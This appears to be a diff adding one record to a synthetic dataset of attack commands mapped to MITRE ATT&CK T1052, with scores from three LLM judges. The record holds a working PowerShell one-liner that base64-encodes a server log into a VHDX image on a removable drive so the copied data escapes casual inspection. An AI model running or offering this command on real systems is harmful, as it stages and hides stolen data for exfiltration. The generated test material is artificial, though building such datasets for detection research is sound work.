@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $vhd=Join-Path $usb 'cache.vhdx'; Mount-DiskImage -ImagePath $vhd -PassThru | Out-Null; $dl=((Get-DiskImage -ImagePath $vhd | Get-Disk | Get-Partition | Get-Volume)[0].DriveLetter); $out=Join-Path (\"$($dl):\\\") 'logs.b64'; [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Logs\\server.log')) | Out-File -Encoding ASCII $out; Dismount-DiskImage -ImagePath $vhd",
+  "explanation": "Mounts a VHDX on the USB and writes base64-encoded log data inside it to reduce casual inspection.",
+  "rationale_steps": [
+    "Mount USB-hosted VHDX",
+    "Base64-encode selected data",
+    "Write encoded data inside mounted image",
+    "Dismount to finalize storage on USB"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-5d8a6105",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner uses valid cmdlets, balanced quotes and parentheses, proper separators, and should parse without errors.",
+        "semantic_score": 4,
+        "semantic_justification": "It stages data for exfiltration by writing base64-encoded logs into a VHDX on a removable drive, aligning with T1052, but assumes an existing, mountable VHDX/volume and likely requires elevated privileges to mount the disk image.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T06:56:50.779423Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, cmdlet usage, balanced parentheses/braces, appropriate piping, and correct method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by identifying a removable drive, mounting a VHDX file on it, base64-encoding log data from the system, writing it to the mounted image, and then dismounting the image to hide the exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:56:53.906596Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct PowerShell syntax, balanced quotes and parentheses, valid flags, and proper command separators, making it perfectly well-formed.",
+        "semantic_score": 3,
+        "semantic_justification": "While the overall approach aligns with T1052 by using a VHDX and base64 encoding, the command fails to create the VHDX file ('cache.vhdx') before attempting to mount it, and `Mount-DiskImage`/`Dismount-DiskImage` cmdlets typically require elevated privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:57:08.821065Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
